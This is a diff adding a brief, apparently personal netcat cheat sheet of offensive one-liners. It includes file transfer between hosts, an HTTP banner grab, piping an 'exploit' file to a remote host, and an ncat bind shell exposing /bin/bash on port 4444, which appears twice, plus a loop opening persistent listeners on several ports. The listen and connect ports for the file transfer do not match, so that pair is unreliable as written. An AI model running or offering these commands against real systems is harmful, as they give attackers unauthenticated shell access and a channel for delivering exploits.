@@ -1,0 +1,21 @@
+
+server 
+nc -l 192.168.0.108 55555 < exploit_file
+client
+nc 192.168.0.108 5555 > exploit_file
+
+######NET CAT BANNER GRAB
+nc  -v 192.168.0.106 80
+HEAD / HTTP/1.1
+
+cat exploit | nc 192.168.0.109 6969
+
+nc 192.168.0.107 7788
+
+ncat -v -e '/bin/bash' -l -p 4444
+
+for port in 77 101 108 111 110;do xterm -T "listening on port ${port}" -hold -e ncat -klvp ${port} &;done
+
+ncat -v -e '/bin/bash' -l -p 4444
+
+
